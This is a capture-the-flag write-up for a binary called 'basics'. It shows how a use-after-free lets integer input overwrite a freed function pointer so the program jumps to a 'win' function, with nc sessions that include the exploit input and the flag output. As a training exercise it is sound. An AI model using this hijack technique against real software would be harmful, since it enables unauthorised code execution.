Back to basics.  (See what I did there? :wink:)

`basics` is an ELF executable that listens on port 2222 and forks for each connection.  Here is a sample interaction:

```
$ nc <redacted> 2222
Creating the function pointer struct...
Doing something with the function pointer struct...
Freeing the function pointer struct...
Creating the integer struct...
Enter 3 integers, separated by newlines:
> 233
>
>
Those integers are: 233, 0, 0,
Freeing the integer struct...
Doing something with the (now free'd) function pointer struct...
```

From this interaction, it may become apparent that there is something shifty going on with the two `struct`s.
At this point, it may be useful to decompile or debug the binary.

Upon inspecting the symbols in the provided ELF binary, you would notice a symbol named `win` at offset address `0x08048953`.
This is a function that needs to be run in order to get the flag.
Converted to decimal, this address is `134515027`.

Hmm. What happens if we paste this address as the inputs?

Turns out, the integer struct uses the same memory space as the freed function pointer `struct`.
The program then attempts to call the function at the function pointer (which has now been overwritten by our address).

So assuming we pasted in the address thrice (as we're supposed to):

```
$ nc <redacted> 2222
Creating the function pointer struct...
Doing something with the function pointer struct...
Freeing the function pointer struct...
Creating the integer struct...
Enter 3 integers, separated by newlines:
> 134515027
> 134515027
> 134515027
Those integers are: 134515027, 134515027, 134515027,
Freeing the integer struct...
Doing something with the (now free'd) function pointer struct...
Congratulations! The key is: 1BVTerWTAuKX42HPX5HAih8wDQusT2aXMh

Use-after-frees are fun.
